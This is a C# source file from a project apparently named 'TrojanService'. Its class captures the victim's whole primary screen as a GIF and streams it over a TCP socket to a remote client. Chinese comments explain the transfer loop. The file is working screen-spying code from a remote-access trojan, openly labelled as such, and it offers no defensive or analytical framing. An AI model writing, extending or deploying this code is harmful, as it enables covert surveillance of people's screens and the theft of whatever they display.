using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace TrojanService
{
    //客户端线程
    class ServerToClient
    {
        TcpClient clientSocket;
        BinaryWriter writer;
        public ServerToClient(TcpClient client)
        {
            clientSocket = client;
            NetworkStream stream = clientSocket.GetStream();
            writer = new BinaryWriter(stream, Encoding.ASCII);
        }

        public void send()
        {
            Image myImg = new Bitmap(Screen.AllScreens[0].Bounds.Width, Screen.AllScreens[0].Bounds.Height);
            Graphics g = Graphics.FromImage(myImg);

            g.CopyFromScreen(new Point(0, 0), new Point(0, 0), Screen.AllScreens[0].Bounds.Size);
            myImg.Save("Capture.gif", System.Drawing.Imaging.ImageFormat.Gif);

            //准备本地数据进行写入网络
            FileStream fs = File.OpenRead("Capture.gif");

            //写入消息头 文件长度，客户端根据此长度进行读取
            writer.Write(fs.Length);
            writer.Flush();

            //本地文件缓冲区
            byte[] data = new byte[10];
            int reds;

            int total = 0;

            //写入的过程：
            //先从本地文件读到缓冲区中，然后把缓冲区的字节数写入网络
            //直到网络写入成功后 再读取足够的字节数到本地文件缓冲区
            //如此往复直到整个文件全部传输出去
            while ((reds = fs.Read(data, 0, data.Length)) > 0)
            {
                writer.Write(data, 0, reds);
                total += reds;
            }
            fs.Close();
            //如果没有进行close操作 tcp端口缓存的字节可能不会立即被发往客户端
            //所以这个是必须的
            writer.Flush();
        }

        public void close()
        {
            writer.Close();
            clientSocket.Close();
        }

        public void sendAdvance()
        {
            Image myImg = new Bitmap(Screen.AllScreens[0].Bounds.Width, Screen.AllScreens[0].Bounds.Height);
            Graphics g = Graphics.FromImage(myImg);

            g.CopyFromScreen(new Point(0, 0), new Point(0, 0), Screen.AllScreens[0].Bounds.Size);
            //writer.Write(long.MaxValue);//不要怕 客户端只要read==0会自动break的

            myImg.Save(writer.BaseStream, System.Drawing.Imaging.ImageFormat.Gif);
            writer.BaseStream.Flush();

        }
    }
}
